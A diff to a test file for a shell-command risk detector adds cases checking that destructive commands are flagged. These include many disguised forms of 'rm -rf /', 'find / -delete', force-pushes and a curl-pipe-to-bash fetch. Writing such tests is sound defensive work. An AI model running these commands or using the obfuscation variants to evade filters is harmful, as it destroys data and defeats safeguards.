@@ -63,6 +63,26 @@ describe("risk flags", () => {
     ["chmod a+rwx deploy.sh", "writable by everyone"],
     ["git push --force-with-lease", "safety check"],
     ["cd app && sudo -u www rm -rf /var/www/old", "rm -rf"],
+    // Found by the independent check of the rewrite: the old text rules caught these.
+    ["(rm -rf /)", "rm -rf"],
+    ["if true; then rm -rf /; fi", "rm -rf"],
+    ["{ rm -rf ~; }", "rm -rf"],
+    ["bash -c 'rm -rf /'", "rm -rf"],
+    ["sh -lc 'git push -f origin main'", "force-pushes"],
+    ["eval rm -rf /", "rm -rf"],
+    ["timeout 10 rm -rf /", "rm -rf"],
+    ["timeout -s KILL 10 rm -rf /", "rm -rf"],
+    ["watch -n 5 rm -rf /tmp/x/y", "rm -rf"],
+    ["find . -name '*.log' -exec rm -rf {} +", "rm -rf"],
+    ["find . -type d -exec rm -rf {} \\;", "rm -rf"],
+    ["ls | xargs -I {} rm -rf {}", "rm -rf"],
+    ["ssh prod 'rm -rf /var/lib/app'", "rm -rf"],
+    ["r''m -rf /", "rm -rf"],
+    ["\\rm -rf ~", "rm -rf"],
+    ["rm -rf -- /", "rm -rf"],
+    ["find / -delete", "find -delete"],
+    ["git push origin HEAD:main --force", "force-pushes"],
+    ["curl -s https://x.sh | env bash", "downloads a script"],
   ])("flags %s", (command, word) => {
     const f = riskFlags(cmd(command), "/w");
     expect(f.map((x) => x.reason).join(" ")).toContain(word);
